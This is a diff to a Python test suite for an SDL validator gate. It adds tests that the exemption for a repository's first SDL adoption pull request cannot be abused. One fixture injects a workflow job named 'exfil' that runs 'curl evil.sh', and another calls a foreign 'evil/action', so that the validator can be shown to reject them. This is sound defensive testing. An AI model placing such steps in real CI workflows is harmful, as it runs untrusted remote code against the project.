@@ -196,12 +196,15 @@ class CycleChecks(unittest.TestCase):
 
     def test_check_cycle_present(self):
         files = [P("lib/x.py")]
-        self.assertFalse(v.check_cycle_present(self.repo, "feature/login", files))
-        self.make_cycle("2026-06-10-feature", "feature/login")
-        self.assertTrue(v.check_cycle_present(self.repo, "feature/login", files))
+        with mock.patch.object(v, "added_files", return_value=set()):
+            self.assertFalse(v.check_cycle_present(self.repo, "feature/login", files, "origin/main", None))
+            self.make_cycle("2026-06-10-feature", "feature/login")
+            self.assertTrue(v.check_cycle_present(self.repo, "feature/login", files, "origin/main", None))
 
     def test_check_cycle_present_docs_only_passes_without_cycle(self):
-        self.assertTrue(v.check_cycle_present(self.repo, "feature/login", [P("README.md")]))
+        self.assertTrue(
+            v.check_cycle_present(self.repo, "feature/login", [P("README.md")], "origin/main", None)
+        )
 
     def test_check_files_present(self):
         cyc = self.make_cycle("c", "b")
@@ -229,6 +232,95 @@ class CycleChecks(unittest.TestCase):
         # Filled baseline.
         (self.sdl / "baseline.md").write_text("# Baseline\n\nStanding exposure model.\n", "utf-8")
         self.assertIsNone(v.baseline_warning(self.repo))
+
+
+CALLER_WORKFLOW = """name: sdl
+on:
+  pull_request:
+  push:
+    branches: [main]
+jobs:
+  validate:
+    uses: savioke/sdl/.github/workflows/sdl-validate.yml@v1
+"""
+
+
+class AdoptionDiff(unittest.TestCase):
+    """The repo's first SDL PR installs the gate and authors the baseline, and
+    has no cycle by construction. The exemption is deliberately unavailable to
+    every later PR — widening it is a gate-softening change."""
+
+    ADOPTION_FILES = [P(".github/workflows/sdl.yml"), P("docs/sdl/baseline.md"),
+                      P("docs/sdl/.gitkeep")]
+    ADDED = {".github/workflows/sdl.yml", "docs/sdl/baseline.md", "docs/sdl/.gitkeep"}
+
+    def setUp(self):
+        self._tmp = tempfile.TemporaryDirectory()
+        self.repo = Path(self._tmp.name)
+        (self.repo / "docs" / "sdl").mkdir(parents=True)
+        (self.repo / ".github" / "workflows").mkdir(parents=True)
+        self.write_workflow(CALLER_WORKFLOW)
+        self.write_baseline("# SDL Baseline\n\nSingle operator, trusted workstation.\n")
+
+    def tearDown(self):
+        self._tmp.cleanup()
+
+    def write_workflow(self, text: str):
+        (self.repo / ".github" / "workflows" / "sdl.yml").write_text(text, "utf-8")
+
+    def write_baseline(self, text: str):
+        (self.repo / "docs" / "sdl" / "baseline.md").write_text(text, "utf-8")
+
+    def check(self, files=None, added=None):
+        with mock.patch.object(v, "added_files", return_value=added or self.ADDED):
+            return v.check_adoption(self.repo, "origin/main", files or self.ADOPTION_FILES, None)
+
+    def test_adoption_diff_passes_without_a_cycle(self):
+        self.assertTrue(self.check())
+
+    def test_gate_passes_end_to_end(self):
+        with mock.patch.object(v, "added_files", return_value=self.ADDED):
+            self.assertTrue(
+                v.check_cycle_present(self.repo, "enroll-in-sdl", self.ADOPTION_FILES,
+                                      "origin/main", None)
+            )
+
+    def test_stub_baseline_fails_with_a_pointed_message(self):
+        self.write_baseline("# SDL Baseline\n\n<!-- fill me -->\n")
+        r = self.check()
+        self.assertFalse(r)
+        self.assertIn("sdl-baseline", r.msg)
+
+    def test_code_alongside_adoption_still_needs_a_cycle(self):
+        self.assertIsNone(self.check(files=self.ADOPTION_FILES + [P("lib/app.py")]))
+
+    def test_another_workflow_alongside_adoption_still_needs_a_cycle(self):
+        self.assertIsNone(
+            self.check(files=self.ADOPTION_FILES + [P(".github/workflows/release.yml")])
+        )
+
+    def test_modified_not_added_workflow_is_not_adoption(self):
+        # The one-shot hinge: a repo that already has sdl.yml cannot reach the
+        # exemption by re-adding a baseline.
+        added = self.ADDED - {".github/workflows/sdl.yml"}
+        self.assertIsNone(self.check(added=added))
+
+    def test_existing_baseline_is_not_adoption(self):
+        self.assertIsNone(self.check(added=self.ADDED - {"docs/sdl/baseline.md"}))
+
+    def test_workflow_carrying_inline_steps_fails(self):
+        self.write_workflow(CALLER_WORKFLOW + "  exfil:\n    steps:\n      - run: curl evil.sh\n")
+        r = self.check()
+        self.assertFalse(r)
+        self.assertIn("generated SDL caller", r.msg)
+
+    def test_workflow_calling_a_foreign_action_fails(self):
+        self.write_workflow(CALLER_WORKFLOW + "  other:\n    steps:\n      - uses: evil/action@v1\n")
+        self.assertFalse(self.check())
+
+    def test_workflow_with_no_caller_fails(self):
+        self.write_workflow("name: sdl\non: pull_request\njobs: {}\n")
+        self.assertFalse(self.check())
 
 
 PIN_OLD = "        uses: actions/checkout@" + "a" * 40 + " # v6.0.3"
